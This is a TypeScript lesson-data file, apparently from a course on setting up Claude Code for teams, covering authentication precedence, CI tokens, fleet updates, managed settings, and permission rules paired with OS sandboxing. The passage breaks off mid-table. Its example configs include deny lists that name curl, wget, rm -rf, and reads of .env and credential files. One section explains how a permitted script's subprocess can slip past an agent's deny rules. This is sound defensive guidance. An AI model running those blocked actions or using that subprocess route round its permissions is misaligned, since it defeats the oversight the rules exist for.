import type { Lesson } from "../../types";
export const LESSONS: Lesson[] = [
 {
  "id": "stage-0",
  "stage": 0,
  "title": "Setup & onboarding",
  "summary": "Setup & onboarding: deployment path selection, authentication precedence, non-interactive authentication.",
  "prerequisites": [],
  "objectives": [
   "Understand the concepts in Setup & onboarding."
  ],
  "definitions": [
   {
    "term": "deployment path selection",
    "short": "Choosing the account/provider route (direct subscription vs cloud provider) that determines billing, auth, and which features you get before any install happens."
   },
   {
    "term": "authentication precedence",
    "short": "Claude Code resolves credentials through a fixed priority order, so the highest-set mechanism wins regardless of what else is configured."
   },
   {
    "term": "non-interactive authentication",
    "short": "Long-lived or vault-backed credentials let Claude Code run in CI and scripts where interactive browser login is impossible."
   },
   {
    "term": "fleet version control",
    "short": "Keeping every team member on a consistent, non-stale Claude Code version, since some install methods auto-update and others silently don't."
   },
   {
    "term": "managed settings precedence",
    "short": "Org-controlled policy that overrides all local user and project config, delivered through ranked sources so admins can enforce rules developers can't undo."
   },
   {
    "term": "permissions paired with sandboxing",
    "short": "Tool-level allow/deny rules only constrain known tools, so true isolation requires combining them with OS-level filesystem and network sandboxing."
   }
  ],
  "sections": [
   {
    "heading": "Before You Install: Deployment Path Selection",
    "body": "Every setup decision downstream — billing model, authentication flow, which features are available, and how you distribute credentials — is locked in the moment you choose a deployment path. Get this decision wrong and you'll spend weeks retroactively migrating a fleet. Get it right and the rest of onboarding is mechanical.\n\nClaude Code supports six distinct deployment paths:\n\n| Path | Who Controls Billing | Auth Mechanism | SSO Available | Managed Policy | Best For |\n|---|---|---|---|---|---|\n| **Claude Pro/Max (personal subscription)** | Individual user | OAuth via claude.ai | No | No | Solo devs, evaluation |\n| **Claude for Teams** | Team admin via claude.ai | OAuth via claude.ai | No | Partial | Smaller teams, self-service billing |\n| **Claude for Enterprise** | Org admin via claude.ai | OAuth via claude.ai + SSO + domain capture | Yes | Yes (server-managed) | Large orgs, compliance, policy enforcement |\n| **Anthropic Console (API billing)** | Org admin via platform.claude.com | API key or Console credentials | Yes (via Console SSO) | Via `managed-settings.json` | Teams preferring API-based billing |\n| **Amazon Bedrock** | AWS account | AWS credentials or Bedrock API key (`AWS_BEARER_TOKEN_BEDROCK`) | Yes (AWS IAM) | Via `managed-settings.json` | AWS-native orgs, data sovereignty |\n| **Google Vertex AI / Microsoft Foundry** | GCP/Azure account | Cloud provider credentials | Yes (cloud IAM) | Via `managed-settings.json` | GCP/Azure-native orgs |\n\n### What the path determines\n\n**Features:** Claude Code on the Web (browser surface) is only available on claude.ai subscription paths (Teams/Enterprise). Cloud provider paths give you access to the CLI, VS Code, JetBrains, and Desktop surfaces but not the Web surface. Check each provider's model availability before committing — not every Claude model is available in every AWS region. Use `aws bedrock list-inference-profiles --region <region>` to verify before committing to Bedrock in a specific region.\n\n**Auth distribution:** Teams and Enterprise paths require every developer to complete a browser OAuth flow once. Cloud provider paths require distributing environment variables — no browser login, which is both a CI enabler and a credential-management responsibility.\n\n**Cost tracking:** Bedrock bills through AWS Cost Explorer; Vertex AI through GCP Billing; Foundry through Azure Cost Management. Console and claude.ai paths bill to Anthropic directly.\n\n**Managed policy:** Org-wide policy enforcement (`forceLoginMethod`, `requiredMinimumVersion`, `allowManagedPermissionRulesOnly`) requires either Claude for Enterprise (server-managed settings via the claude.ai admin console — no file distribution needed) or deploying `managed-settings.json` via MDM/file on every machine. Console and cloud provider paths rely entirely on the file-based approach.\n\n### Common decision pitfalls\n\n- **Choosing Pro/Max for a team** — each seat is individually billed with no central admin view, no managed policy surface, and no way to revoke access without the individual canceling their own subscription.\n- **Choosing Bedrock before checking model availability** — not every Claude model is available in every AWS region. Cross-region inference profiles (the `us.` prefix on model IDs) broaden availability but add a routing hop.\n- **Deferring the decision** — individual developers who install with personal Pro accounts accumulate per-user settings files, per-user credential caches, and per-user `.mcp.json` configurations. Migrating them to an org-managed path later requires a coordinated credential flush and re-authentication."
   },
   {
    "heading": "Authentication Precedence: The Credential Resolution Stack",
    "body": "Claude Code resolves credentials through a fixed six-level priority stack. The highest-set mechanism wins — it does not merge or average across levels. Understanding this stack is essential because misconfigured environments produce confusing failures: a developer's org subscription stops working silently because a stale `ANTHROPIC_API_KEY` from a personal project is taking precedence.\n\nThe resolution order, from highest to lowest priority (sourced from the official authentication docs):\n\n```\n1. Cloud provider credentials\n   (when CLAUDE_CODE_USE_BEDROCK, CLAUDE_CODE_USE_VERTEX, or CLAUDE_CODE_USE_FOUNDRY is set)\n\n2. ANTHROPIC_AUTH_TOKEN environment variable\n   (sent as Authorization: Bearer; use for LLM gateway/proxy flows)\n\n3. ANTHROPIC_API_KEY environment variable\n   (sent as X-Api-Key; for direct Anthropic API via Console key;\n    in interactive mode you are prompted once to approve or decline;\n    in non-interactive mode, -p, the key is always used when present)\n\n4. apiKeyHelper script output\n   (shell script returning an API key; use for vault-backed or rotating credentials)\n\n5. CLAUDE_CODE_OAUTH_TOKEN environment variable\n   (long-lived OAuth token generated by `claude setup-token`; use for CI)\n\n6. Subscription OAuth credentials from /login\n   (default for Pro/Max/Teams/Enterprise users)\n```\n\n**Important scope:** `apiKeyHelper`, `ANTHROPIC_API_KEY`, and `ANTHROPIC_AUTH_TOKEN` apply to terminal CLI sessions only. Claude Desktop and cloud sessions use OAuth exclusively and ignore these variables and the `apiKeyHelper` setting entirely.\n\n### The critical interaction: API key overrides subscription\n\nIf a developer has an active Claude for Teams subscription but also has `ANTHROPIC_API_KEY` set in their shell profile (common if they previously used the API directly), the API key takes precedence at level 3. The result is an auth failure with an error message about API key validation, not subscription access, which sends developers down the wrong diagnostic path.\n\nDiagnose and fix:\n\n```bash\n# Check which method is currently active\n/status   # inside a running Claude Code session\n\n# Remove the API key to fall back to subscription\nunset ANTHROPIC_API_KEY\n\n# Find all locations where it may be set\ngrep -r ANTHROPIC_API_KEY ~/.bashrc ~/.zshrc ~/.profile ~/.bash_profile\n```\n\n### Environment variable vs settings field precedence\n\nWhere the same behavior has both an environment variable and a `settings.json` key, the environment variable wins. For example, `ANTHROPIC_MODEL` overrides the `model` key in any settings file. This means your managed settings file can be overridden at the env var level, which is worth auditing if developers have custom dotfiles.\n\n### LLM gateway flows\n\nIf your org routes requests through a centralized LLM gateway, use `ANTHROPIC_AUTH_TOKEN` (level 2) to send a bearer token and set `ANTHROPIC_BASE_URL` to your gateway:\n\n```bash\nexport ANTHROPIC_AUTH_TOKEN=your-bearer-token\nexport ANTHROPIC_BASE_URL=https://your-llm-gateway.example.com\n```\n\nFor Bedrock, Vertex, or Foundry traffic routed through a gateway, use the provider-specific base URL variables (`ANTHROPIC_BEDROCK_BASE_URL`, `ANTHROPIC_VERTEX_BASE_URL`, `ANTHROPIC_FOUNDRY_BASE_URL`) instead.\n\n### The `apiKeyHelper` escape hatch (level 4)\n\nThe `apiKeyHelper` setting in `settings.json` runs a shell script and uses its stdout as the API key. This is the right integration point for secrets managers (HashiCorp Vault, AWS Secrets Manager, 1Password CLI):\n\n```json\n{\n  \"apiKeyHelper\": \"~/.local/bin/fetch-claude-key.sh\"\n}\n```\n\n```bash\n#!/usr/bin/env bash\n# fetch-claude-key.sh — fetches from Vault\nvault kv get -field=api_key secret/team/claude-code\n```\n\nBy default the helper is called after 5 minutes idle or on HTTP 401. Set `CLAUDE_CODE_API_KEY_HELPER_TTL_MS` to control the refresh interval. If the script takes longer than 10 seconds, Claude Code displays a timing warning in the prompt bar showing elapsed time."
   },
   {
    "heading": "Non-Interactive Authentication: CI, Scripts, and Headless Environments",
    "body": "The default auth flow opens a browser window. In CI pipelines, Docker containers, SSH sessions, and WSL2, there is no browser. Four mechanisms handle this; which one you choose depends on your deployment path.\n\n### Method 1: `ANTHROPIC_API_KEY` (Console billing path)\n\nFor teams on Console billing, generate an API key from the Claude Console (`platform.claude.com`) and inject it as a secret in your CI system:\n\n```yaml\n# GitHub Actions example\njobs:\n  code-review:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Run Claude Code non-interactively\n        env:\n          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}\n        run: |\n          claude -p \"Review the diff for security issues\" --output-format json\n```\n\nIn non-interactive mode (`-p` flag), `ANTHROPIC_API_KEY` is always used when present — no approval prompt is shown as there would be in interactive mode.\n\n### Method 2: `CLAUDE_CODE_OAUTH_TOKEN` (subscription billing path)\n\nFor teams on Teams/Enterprise subscriptions, generate a one-year OAuth token:\n\n```bash\n# Run once interactively on a developer machine\nclaude setup-token\n# Follow the OAuth flow in the browser\n# Copy the printed token — Claude Code does NOT save it anywhere\n\n# Inject it as a CI secret\nexport CLAUDE_CODE_OAUTH_TOKEN=your-one-year-token\n```\n\nThis token authenticates with your subscription and requires a Pro, Max, Teams, or Enterprise plan. It is scoped to inference only — it cannot establish Remote Control sessions.\n\n**Critical caveat:** Bare mode (`--bare`) does not read `CLAUDE_CODE_OAUTH_TOKEN`. If your CI script uses `--bare` for faster startup, authenticate with `ANTHROPIC_API_KEY` or `apiKeyHelper` instead.\n\n### Method 3: Cloud provider credentials (Bedrock / Vertex / Foundry)\n\nSet the provider activation flag and supply credentials through the cloud provider's standard mechanism — no Anthropic token needed:\n\n```bash\n# Bedrock: uses AWS credential chain (IAM role, instance profile, env vars)\nexport CLAUDE_CODE_USE_BEDROCK=1\nexport AWS_REGION=us-east-1\n# In CI with an IAM role attached to the runner, nothing else is needed.\n# For access-key auth:\nexport AWS_ACCESS_KEY_ID=...\nexport AWS_SECRET_ACCESS_KEY=...\nexport AWS_SESSION_TOKEN=...   # required for temporary credentials\n\n# Bedrock API key (simpler, no full AWS credential chain)\nexport AWS_BEARER_TOKEN_BEDROCK=your-bedrock-api-key\n```\n\nBedrock's IAM-role-based auth is the most secure CI option: no long-lived credentials exist, the runner's instance profile is scoped by IAM policy, and credential rotation is automatic.\n\n### Method 4: `apiKeyHelper` (vault-backed, rotating)\n\nThe most robust option for security-conscious teams: a script fetches short-lived credentials from a vault at runtime, and the helper is called automatically on TTL expiry or 401:\n\n```json\n{\n  \"apiKeyHelper\": \"/usr/local/bin/fetch-claude-token\"\n}\n```\n\n### Handling the browser-redirect problem in WSL2 and SSH\n\nWhen the browser can't reach Claude Code's local callback server (WSL2, SSH tunnels, containers), the login page shows a code instead of redirecting back. Paste that code at the `Paste code here if prompted` terminal prompt. Alternatively, press `c` at the terminal prompt to copy the login URL to your clipboard and open it on a machine with a reachable browser.\n\n### Comparison table\n\n| Method | Credential lifetime | Rotation | Works with `--bare` | Billing path |\n|---|---|---|---|---|\n| `ANTHROPIC_API_KEY` | Until revoked | Manual | Yes | Console |\n| `CLAUDE_CODE_OAUTH_TOKEN` | 1 year | Manual re-run of `setup-token` | No | Subscription |\n| Bedrock IAM role | Session-scoped (STS) | Automatic | Yes | AWS |\n| `AWS_BEARER_TOKEN_BEDROCK` | Until revoked | Manual | Yes | AWS |\n| `apiKeyHelper` | Configurable via `CLAUDE_CODE_API_KEY_HELPER_TTL_MS` | Automatic via script | Yes | Any |\n| Subscription OAuth (`/login`) | Rolling (managed by Anthropic) | Automatic | No | Subscription |"
   },
   {
    "heading": "Fleet Version Control: Install Methods and Update Behavior",
    "body": "Claude Code ships frequent updates. Some install methods silently auto-update; others silently don't. On a team of 20, running different versions produces inconsistent behavior — a permission rule or hook that works on one version may not exist on an older one — and the differences are nearly impossible to debug without first establishing that everyone is on the same version.\n\n### Install method update behavior\n\n| Install method | Auto-updates | Manual upgrade command | Notes |\n|---|---|---|---|\n| **Native installer** (`install.sh` / `install.ps1` / `install.cmd`) | Yes (background) | `claude update` | Checks on startup and periodically; takes effect next launch |\n| **Homebrew `claude-code`** | No | `brew upgrade --cask claude-code` | Tracks stable channel (~1 week behind) |\n| **Homebrew `claude-code@latest`** | No | `brew upgrade --cask claude-code@latest` | Tracks latest channel |\n| **WinGet** | No | `winget upgrade Anthropic.ClaudeCode` | Requires manual run |\n| **apt (Debian/Ubuntu)** | No | `sudo apt update && sudo apt upgrade claude-code` | Two channels: `stable` and `latest` repos |\n| **dnf (Fedora/RHEL)** | No | `sudo dnf upgrade claude-code` | Two channels |\n| **apk (Alpine)** | No | `apk update && apk upgrade claude-code` | Two channels |\n| **npm** | No | `npm install -g @anthropic-ai/claude-code@latest` | Avoid `npm update -g`; it respects the semver range from the original install |\n\n**The practical fleet problem:** Developers who installed via the native installer are silently always current; developers who installed via Homebrew, apt, dnf, or apk are on whatever version they last upgraded to. The divergence is invisible until something breaks.\n\n**Opt-in auto-update for Homebrew and WinGet:** You can have Claude Code run the upgrade command for you on Homebrew and WinGet by setting `CLAUDE_CODE_PACKAGE_MANAGER_AUTO_UPDATE` to `1` in your settings `env` block. Claude Code runs the upgrade in the background when a new version is available and shows a restart prompt on success. On WinGet, the upgrade may fail while Claude Code is running because Windows locks the executable; Claude Code falls back to showing the manual command in that case. The `apt`, `dnf`, and `apk` package managers continue to require manual upgrades because those commands need elevated privileges.\n\n### Release channels\n\n- **`latest`** (default): every release as it ships.\n- **`stable`**: approximately one week behind, skips releases with major regressions.\n\nSet the channel in `settings.json` (applies to native and npm installations). For Homebrew, the channel is the cask name (`claude-code` = stable, `claude-code@latest` = latest). For `apt`, `dnf`, and `apk`, the channel is in the repository URL path (`/apt/stable` or `/apt/latest`).\n\n```json\n{\n  \"autoUpdatesChannel\": \"stable\"\n}\n```\n\n### Version floor and ceiling: `minimumVersion` vs `requiredMinimumVersion`\n\nThese two settings are distinct and easy to confuse:\n\n**`minimumVersion`** (user or project `settings.json`): a soft floor. Auto-updates and `claude update` refuse to go below this version. Use when switching from `latest` to `stable` to avoid a downgrade.\n\n**`requiredMinimumVersion` / `requiredMaximumVersion`** (managed settings only): a hard gate. Claude Code refuses to start if the current version falls outside this range. This is the enforcement tool for fleet-wide version control:\n\n```json\n// managed-settings.json — deployed by MDM or IT\n{\n  \"requiredMinimumVersion\": \"2.1.100\",\n  \"requiredMaximumVersion\": \"2.2.999\"\n}\n```\n\nNote: invalid values for `requiredMinimumVersion` / `requiredMaximumVersion` are dropped (a malformed policy cannot prevent startup).\n\n### Pinning a specific version for install\n\nThe native installer accepts a version number or channel as an argument (macOS/Linux/WSL):\n\n```bash\n# Install a specific version\ncurl -fsSL https://claude.ai/install.sh | bash -s 2.1.89\n\n# Install stable channel\ncurl -fsSL https://claude.ai/install.sh | bash -s stable\n```\n\n### Disabling auto-updates\n\nTwo separate variables control this:\n\n- `DISABLE_AUTOUPDATER`: stops background checks only. `claude update` and `claude install` still work.\n- `DISABLE_UPDATES`: blocks all update paths including manual `claude update`. Use this when you distribute Claude Code through your own internal channels and need users to stay on the version you provide.\n\n```json\n{\n  \"env\": {\n    \"DISABLE_UPDATES\": \"1\"\n  }\n}\n```\n\n### Verifying the installed version\n\n```bash\nclaude --version\nclaude doctor   # shows version and result of most recent update attempt\n```\n\n### Binary integrity verification\n\nEach release publishes a GPG-signed `manifest.json` with SHA256 checksums for every platform binary. Verify before distributing internally:\n\n```bash\n# Step 1: Import the signing key and verify its fingerprint\ncurl -fsSL https://downloads.claude.ai/keys/claude-code.asc | gpg --import\ngpg --fingerprint security@anthropic.com\n# Expected: 31DD DE24 DDFA B679 F42D 7BD2 BAA9 29FF 1A7E CACE\n\n# Step 2: Download manifest and signature for a specific version\nREPO=https://downloads.claude.ai/claude-code-releases\nVERSION=2.1.89\ncurl -fsSLO \"$REPO/$VERSION/manifest.json\"\ncurl -fsSLO \"$REPO/$VERSION/manifest.json.sig\"\n\n# Step 3: Verify\ngpg --verify manifest.json.sig manifest.json\n# A valid result reports: Good signature from\n# \"Anthropic Claude Code Release Signing <security@anthropic.com>\"\n```\n\nManifest signatures are available for releases from `2.1.89` onward. For Linux package manager installs (apt/dnf/apk), your package manager verifies signatures automatically using the repository signing key — no manual step needed."
   },
   {
    "heading": "Managed Settings Precedence: Org Policy That Developers Cannot Override",
    "body": "Claude Code's settings system has five scopes. The most critical for fleet management is the managed scope, which sits above everything else and cannot be overridden by any user or project configuration.\n\n### The full precedence stack (highest to lowest)\n\n```\n1. Managed         — IT-deployed or server-managed; cannot be overridden\n2. Command-line args — temporary session overrides\n3. Local           — .claude/settings.local.json (gitignored, per-machine)\n4. Project         — .claude/settings.json (git-committed, team-shared)\n5. User            — ~/.claude/settings.json (all projects, personal)\n```\n\n**Exception for permission rules:** Permission rules merge across scopes rather than override. A deny rule in managed settings and an allow rule in project settings coexist — and deny wins when both match.\n\n**Exception for array keys:** For array settings (such as `sandbox.filesystem.allowWrite`), values from all scopes are merged together, not replaced. A developer can therefore append to these arrays. To lock specific arrays to managed-only values, use the corresponding managed-only lockdown keys (e.g., `allowManagedReadPathsOnly`, `allowManagedDomainsOnly`).\n\n### Settings files: what goes where\n\n| File | Scope | Committed to git | Who writes it |\n|---|---|---|---|\n| Managed settings (MDM/file/registry/server) | All users on machine | No (IT-deployed) | IT/DevOps |\n| `~/.claude/settings.json` | You, all projects | No | Developer |\n| `.claude/settings.json` | All repo collaborators | Yes | Team |\n| `.claude/settings.local.json` | You, this repo only | No (auto-gitignored) | Developer |\n\n### Delivering managed settings\n\nManaged settings reach developer machines through four mechanisms:\n\n**1. Server-managed (Claude for Enterprise only):** Configured in the claude.ai admin console. Settings are pushed to clients automatically — no file distribution needed. This is the recommended approach for Enterprise.\n\n**2. macOS MDM (Jamf, Kandji, etc.):** Deploy to the `com.anthropic.claudecode` managed preferences domain. Plist top-level keys mirror `managed-settings.json`.\n\n**3. Windows Registry:**\n- Machine-wide (admin-level): `HKLM\\SOFTWARE\\Policies\\ClaudeCode` — `Settings` value (REG_SZ or REG_EXPAND_SZ) containing JSON.\n- Per-user: `HKCU\\SOFTWARE\\Policies\\ClaudeCode` — lowest policy priority, only used when no admin-level source exists.\n\n**4. File-based:** Drop a file at the OS-specific path:\n- macOS: `/Library/Application Support/ClaudeCode/managed-settings.json`\n- Linux/WSL: `/etc/claude-code/managed-settings.json`\n- Windows: `C:\\Program Files\\ClaudeCode\\managed-settings.json`\n\nAll system directories also support a drop-in directory (`managed-settings.d/*.json`) that merges alphabetically, so different teams can own separate policy slices without coordinating on a single file:\n\n```\n/etc/claude-code/\n  managed-settings.json           # base org policy\n  managed-settings.d/\n    10-security.json              # security team\n    20-telemetry.json             # observability team\n    30-approved-mcp-servers.json  # platform team\n```\n\nLater files override scalar values; arrays concatenate and deduplicate; objects deep-merge. Hidden files (starting with `.`) are ignored.\n\n### Key managed-only settings\n\nThe following settings can only be set from a managed source — they are silently ignored in user, project, or local settings:\n\n```json\n{\n  // Force a specific login method\n  \"forceLoginMethod\": \"claudeai\",  // or \"console\"\n\n  // Require a specific org UUID\n  \"forceLoginOrgUUID\": \"your-org-uuid\",\n\n  // Hard version gate\n  \"requiredMinimumVersion\": \"2.1.100\",\n  \"requiredMaximumVersion\": \"2.2.999\",\n\n  // Prevent developers from defining their own permission rules\n  \"allowManagedPermissionRulesOnly\": true,\n\n  // Prevent developer-defined hooks\n  \"allowManagedHooksOnly\": true,\n\n  // Lock MCP server configuration\n  \"allowManagedMcpServersOnly\": true,\n  \"allowedMcpServers\": [\"github\", \"filesystem\"],\n  \"deniedMcpServers\": [\"untrusted-server\"],\n\n  // Inject org-wide CLAUDE.md content\n  \"claudeMd\": \"Always run make lint before committing.\",\n\n  // Restrict which channels/plugins are permitted\n  \"channelsEnabled\": false,\n  \"allowedChannelPlugins\": []\n}\n```\n\nA complete list of managed-only keys includes: `allowAllClaudeAiMcps`, `allowedChannelPlugins`, `allowedMcpServers`, `allowManagedHooksOnly`, `allowManagedMcpServersOnly`, `allowManagedPermissionRulesOnly`, `blockedMarketplaces`, `channelsEnabled`, `claudeMd`, `deniedMcpServers`, `forceRemoteSettingsRefresh`, `forceLoginMethod`, `forceLoginOrgUUID`, `parentSettingsBehavior`, `pluginSuggestionMarketplaces`, `pluginTrustMessage`, `policyHelper`, `requiredMaximumVersion`, `requiredMinimumVersion`, and `strictKnownMarketplaces`.\n\n### Invalid entry tolerance\n\nManaged settings parse tolerantly — invalid entries are stripped with warnings rather than causing Claude Code to fail to start. However, certain security fields have stricter fallback behavior:\n\n- `allowManagedMcpServersOnly: <invalid>` → treated as `true` (fail secure)\n- `enforceAvailableModels: <invalid>` → treated as `true`\n- `forceLoginOrgUUID: <invalid>` → blocks login entirely\n- `requiredMinimumVersion / requiredMaximumVersion: <invalid>` → values are dropped (a bad policy cannot prevent startup)\n\n### Testing before fleet rollout\n\nAlways validate on a test machine before pushing managed settings org-wide:\n\n```bash\nclaude doctor   # shows managed settings source and parse result\n```"
   },
   {
    "heading": "Permissions Paired with Sandboxing: Two Complementary Layers",
    "body": "A common misconception: adding `deny` rules to `settings.json` creates a security boundary. It doesn't. Permission rules are evaluated before a tool runs, based on the command string Claude Code proposes. OS-level sandboxing restricts what a running process can actually access, including all child processes. You need both layers for real isolation.\n\n### What each layer controls\n\n**Permission rules** (`settings.json` `permissions.allow/deny/ask`):\n- Evaluated before any tool runs, based on the tool name and command string pattern.\n- Apply to all tools: Bash, Read, Edit, WebFetch, MCP tools, and others.\n- Can be defined in any scope (managed, user, project, local).\n- Enforced by Claude Code's permission engine, not the OS.\n\n**Sandbox** (`/sandbox` command, `sandbox.*` settings):\n- OS-level enforcement applied to the Bash tool and all its child processes.\n- Restricts filesystem access (read/write paths) and network access (allowed domains).\n- Enforced by macOS Seatbelt or Linux bubblewrap — not bypassable by the running process.\n- Applies to Bash commands and their descendants; the built-in file tools (Read, Edit, Write) use the permission system directly rather than running through the sandbox.\n\n### Permission rule syntax\n\n```json\n{\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(npm run lint)\",\n      \"Bash(npm run test *)\",\n      \"Read(~/.zshrc)\"\n    ],\n    \"deny\": [\n      \"Bash(curl *)\",\n      \"Bash(wget *)\",\n      \"Read(./.env)\",\n      \"Read(./.env.*)\",\n      \"Read(./secrets/**)\"\n    ],\n    \"ask\": [\n      \"Bash(git push *)\"\n    ]\n  }\n}\n```\n\nRule matching: `*` matches within a path segment; `**` matches any depth. Deny takes precedence over allow when both match. Rules merge across scopes (higher scope adds to lower — they do not replace).\n\n### Why permission rules alone are insufficient\n\nPermission rules operate on what Claude Code proposes to run. They do not constrain what a permitted command does at runtime. A rule like `allow Bash(npm run build)` permits the npm script — but if that script calls `curl` as a subprocess, the permission engine never sees that subprocess call. The deny rule for `curl` only fires when Claude Code directly proposes a `curl` invocation.\n\nThe sandbox closes this gap: its filesystem and network restrictions apply to all processes spawned by any Bash command, including subprocesses that the permission engine never evaluates.\n\n### Enabling the sandbox\n\nOn macOS, there is nothing to install — sandboxing uses the built-in Seatbelt framework. The sandbox does not run on native Windows; use WSL2 there. On Linux/WSL2, install two packages:\n\n```bash\n# Ubuntu/Debian\nsudo apt-get install bubblewrap socat\n\n# Fedora\nsudo dnf install bubblewrap socat\n\n# Ubuntu 24.04+: check and fix AppArmor restriction on user namespaces\n# Only needed if: sysctl kernel.apparmor_restrict_unprivileged_userns returns 1\nsudo tee /etc/apparmor.d/bwrap > /dev/null <<'EOF'\nabi <abi/4.0>,\ninclude <tunables/global>\n\nprofile bwrap /usr/bin/bwrap flags=(unconfined) {\n  userns,\n  include if exists <local/bwrap>\n}\nEOF\nsudo systemctl reload apparmor\n```\n\nThen enable inside a session:\n```\n/sandbox\n```\n\nOr in `settings.json` to enable for all projects:\n\n```json\n{\n  \"sandbox\": {\n    \"enabled\": true,\n    \"filesystem\": {\n      \"allowWrite\": [\"~/.kube\", \"/tmp/build\"],\n      \"denyRead\": [\"~/\"],\n      \"allowRead\": [\".\"]\n    }\n  }\n}\n```\n\n### Key sandbox defaults to know\n\n- **Default write:** current working directory and the session temp directory only.\n- **Default read:** the entire filesystem — including `~/.aws/credentials`, `~/.ssh/`. Add explicit `denyRead` entries to protect credentials from subprocess exfiltration.\n- **Default network:** no domains are pre-allowed. The first request to a new domain triggers an approval prompt. Pre-allow domains with `allowedDomains` to avoid prompts.\n\n### Enforcing sandbox org-wide via managed settings\n\n```json\n{\n  \"sandbox\": {\n    \"enabled\": true,\n    \"failIfUnavailable\": true,\n    \"allowUnsandboxedCommands\": false,\n    \"filesystem\": {\n      \"denyRead\": [\"~/\"]\n    }\n  }\n}\n```\n\n- `failIfUnavailable: true` — Claude Code refuses to start if bubblewrap is missing on Linux/WSL2, rather than silently falling back to no sandboxing.\n- `allowUnsandboxedCommands: false` — the `dangerouslyDisableSandbox` escape hatch is disabled. Commands that can't run sandboxed fail outright rather than falling back to unsandboxed execution.\n\n### The layered model in practice\n\nA hardened configuration uses both layers:\n\n```json\n{\n  \"permissions\": {\n    \"deny\": [\n      \"Bash(curl *)\",\n      \"Bash(wget *)\",\n      \"Read(./.env*)\"\n    ]\n  },\n  \"sandbox\": {\n    \"enabled\": true,\n    \"failIfUnavailable\": true,\n    \"allowUnsandboxedCommands\": false,\n    \"filesystem\": {\n      \"denyRead\": [\"~/\"]\n    }\n  }\n}\n```\n\nThe deny rules prevent Claude from proposing `curl`. The sandbox prevents any subprocess (including transitive children of allowed commands) from reading credential files or writing outside the project directory. Neither layer alone achieves both goals.\n\n### What the sandbox does not isolate\n\nThe sandbox isolates Bash subprocesses only. Built-in file tools (Read, Edit, Write) use the permission system directly. When Claude opens apps and controls your screen (computer use), it runs on your actual desktop. Sandboxed Bash commands also inherit the parent process environment by default — including any credential variables set there. Set `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` to strip Anthropic and cloud provider credentials from subprocesses."
   },
   {
    "heading": "Per-Repo Onboarding Artifacts: Checked-In Context Files",
    "body": "Every Claude Code session starts by reading a set of files that provide project context. When these files are checked into the repo, every team member gets identical context on first launch. When they're not checked in, context is ad hoc: configurations drift, and new team members miss everything.\n\n### The artifact set\n\n```\nyour-repo/\n├── CLAUDE.md                    # primary project instructions (git-committed)\n├── CLAUDE.local.md              # personal project notes (gitignored)\n├── .claude/\n│   ├── settings.json            # team-shared tooling policy (git-committed)\n│   ├── settings.local.json      # per-machine overrides (auto-gitignored)\n│   ├── agents/                  # subagent definitions (git-committed)\n│   ├── skills/                  # team skills (git-committed)\n│   └── rules/                   # path-scoped rule files (git-committed)\n└── .mcp.json                    # project MCP server config (git-committed)\n```\n\n### CLAUDE.md: the project brief\n\n`CLAUDE.md` is the primary context file. Claude Code reads it at session start and injects it into every conversation. It is not a README — it is a structured brief written for Claude, not for humans. Keep it under 200 lines; files over that length consume more context and reduce adherence.\n\n```markdown\n# acme-api — project instructions\n\n## Architecture\nFastAPI + PostgreSQL + Redis. Entry point: `src/main.py`.\nDo not use SQLAlchemy; we use raw asyncpg. See `src/db/` for patterns.\n\n## Testing\n- Run `make test` before any commit — this runs pytest + mypy + ruff.\n- Tests live in `tests/`. Fixtures in `tests/conftest.py`.\n- Integration tests require a running Postgres; `make test-unit` runs unit tests only.\n\n## Code conventions\n- All public functions need docstrings (Google style).\n- Pydantic v2 models with `Field(description=...)` on every field.\n- Never hardcode timeouts; use `settings.py` constants.\n\n## Critical files\n- `src/config/settings.py` — all configurable values, read from env.\n- `src/db/migrations/` — Alembic migrations; run `make migrate` to apply.\n```\n\n**File loading order:** Claude Code walks up the directory tree from your working directory, loading `CLAUDE.md` and `CLAUDE.local.md` from each level. All discovered files are concatenated (not overriding). Files closer to the filesystem root appear earlier in context; files closer to your working directory appear later and therefore take effective precedence. Subdirectory CLAUDE.md files load on demand when Claude reads files in those subdirectories, not at session start.\n\nFor a repo with vendored dependencies where upstream CLAUDE.md files could pollute context:\n\n```json\n{\n  \"claudeMdExcludes\": [\n    \"**/vendor/**/CLAUDE.md\",\n    \"**/node_modules/**/CLAUDE.md\"\n  ]\n}\n```\n\nOrg-wide CLAUDE.md can be deployed to the managed path on each machine:\n- macOS: `/Library/Application Support/ClaudeCode/CLAUDE.md`\n- Linux/WSL: `/etc/claude-code/CLAUDE.md`\n- Windows: `C:\\Program Files\\ClaudeCode\\CLAUDE.md`\n\nAlternatively, the `claudeMd` key in `managed-settings.json` embeds org-wide instructions directly without a separate file (managed settings only).\n\n### `.claude/settings.json`: team tooling policy\n\n```json\n{\n  \"$schema\": \"https://json.schemastore.org/claude-code-settings.json\",\n  \"permissions\": {\n    \"allow\": [\n      \"Bash(make *)\",\n      \"Bash(npm run lint)\",\n      \"Bash(npm run test *)\",\n      \"Bash(git log *)\",\n      \"Bash(git diff *)\",\n      \"Bash(git status *)\"\n    ],\n    \"deny\": [\n      \"Bash(git push --force *)\",\n      \"Bash(rm -rf *)\",\n      \"Read(./.env)\",\n      \"Read(./.env.*)\"\n    ]\n  },\n  \"env\": {\n    \"CLAUDE_CODE_ENABLE_TELEMETRY\": \"1\"\n  }\n}\n```\n\nAdd `\"$schema\"` for editor autocomplete. Commit `.claude/settings.json`; `.claude/settings.local.json` is automatically gitignored by Claude Code.\n\n### `.mcp.json`: project MCP servers\n\n```json\n{\n  \"mcpServers\": {\n    \"github\": {\n      \"command\": \"node\",\n      \"args\": [\"~/.claude/servers/github.js\"],\n      \"env\": {\n        \"GITHUB_TOKEN\": \"${GITHUB_TOKEN}\"\n      }\n    },\n    \"postgres\": {\n      \"command\": \"npx\",\n      \"args\": [\"-y\", \"@anthropic-ai/mcp-server-postgres\"],\n      \"env\": {\n        \"DATABASE_URL\": \"${DATABASE_URL}\"\n      }\n    }\n  }\n}\n```\n\nCredentials use `${VAR}` interpolation — the actual values come from the developer's environment, not the committed file.\n\n### What belongs in each file: committed vs personal\n\n| Content | File | Why |\n|---|---|---|\n| Project architecture, conventions, critical files | `CLAUDE.md` | Shared context every session needs |\n| Team-approved Bash commands | `.claude/settings.json` allow rules | Reduces permission prompts for known-safe commands |\n| Team-enforced deny rules | `.claude/settings.json` deny rules | Guards against dangerous patterns |\n| Project MCP servers | `.mcp.json` | Everyone needs the same 